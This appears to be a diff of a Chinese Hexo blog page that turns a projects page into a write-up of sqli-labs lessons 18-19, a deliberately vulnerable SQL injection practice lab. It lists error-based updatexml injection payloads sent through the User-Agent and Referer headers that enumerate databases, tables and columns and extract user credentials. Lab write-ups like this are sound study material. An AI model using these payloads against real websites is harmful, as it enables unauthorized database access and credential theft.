@@ -10,7 +10,7 @@
   
   <title>
     
-      Project | Hexo
+      sqli-labs-Less18-22 | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -193,55 +193,163 @@
 </header>
 
     <div id="article-banner">
-  <h2>Projects</h2>
-  <p class="post-date">GitHub Open Source Projects</p>
+  <h2>sqli-labs-Less18-22</h2>
+  <p class="post-date">2021-10-19</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
 </div>
-<main class="app-body project-app">
-  <div class="card-container" id="all-project"></div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h4 id="Less18-19">Less18-19</h4>
+<p>Less18-19仍是POST方式下的sqli注入，执行的方式和函数与以前大致相同，但是发现不管是username还是password，用‘#都会报错，说明注入点不在这里。</p>
+<p>然后我们根据回显的提示可以知道回显点在哪里，并且在源码下echo助于我们阅读，接着我们需要添加<strong>modify header</strong>这个插件。注入的位置分别是：Less18在User-Agent，Less19在Referer。（账号密码要在正确的前提下）</p>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/%E3%80%81%E3%80%81.png" alt></p>
+<p>如果在sqli中不知道账号密码，尤其是密码，在我们POST下，账号一般为admin，密码的话，有两种方式可以知道。</p>
+<p>1、回忆Less17我们是修改密码，这是一个方式。</p>
+<p>2、重置数据库内容就好。（Setup/reset）</p>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/96%E3%80%81.png" alt></p>
+<p>我们手工注入的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Less18-19</span><br><span class="line">select updatexml(1,concat(0x7e,(database())),1); // 查库1</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;1 // 闭合方式1</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(database())),1), &#x27;&#x27;,&#x27;&#x27;)# // 闭合方式2</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 查库</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 表</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 查列</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select id,username,password from security.users limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 查字段</span><br></pre></td></tr></table></figure>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/10/17/Bugku-web%E7%BB%83%E4%B9%A0-2/">
+        <span class="nav-arrow">← </span>
+        
+          Bugku-web练习-2
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less18-19"><span class="toc-nav-text">Less18-19</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
 </main>
+
 <script>
-  (function() {
-    var url = 'http://example.com/project/index.html';
-    $('#article-banner').geopattern(url);
+  (function () {
+    var url = 'http://example.com/2021/10/19/sqli-labs-Less18-22/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
     $('.header').removeClass('fixed-header')
-    $.ajax({
-      headers: {
-        Accept: 'application/vnd.github.v3.raw'
-      },
-      type: 'get',
-      url: 'https://api.github.com/users/yanm1ng/repos',
-      success: function (data) {
-        var repos = data.sort(function(a, b) {
-          return (b.stargazers_count - a.stargazers_count)
-        }).slice(0, 6)
-        var cardHtml = repos.map(function(item) {
-          var description = item.description || ""
-          if (description.replace(/[\u0391-\uFFE5]/g, "aa").length > 72) {
-            description = description.slice(0, 72) + '...'
-          }
-          return (
-            '<section class="project-card">' + 
-              '<a class="card-wrap" href="'+ item.html_url +'" target="_blank">' +
-                '<div class="card-header" data-name="'+ item.name +'"></div>' +
-                '<h3 class="card-title">' + item.name + '</h3>' +
-                '<p class="card-description">' + description + '</p>' +
-                '<div class="card-footer">' +
-                  '<span><i class="fa fa-star"></i>'+ item.stargazers_count +'</span>' +
-                  '<span><i class="fa fa-code-fork"></i>' + item.forks_count +'</span>' +
-                '</div>' +
-              '</a>' +
-            '</section>'
-          )
-        }).join('')
-        $('#all-project').html(cardHtml)
-        $('.card-header').each(function() {
-          var name = $(this).data('name');
-          $(this).geopattern(name);
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
         })
       }
-    });
-  })()
+    })
+  })();
 </script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
     <div class="scroll-top">
   <span class="arrow-icon"></span>
 </div>
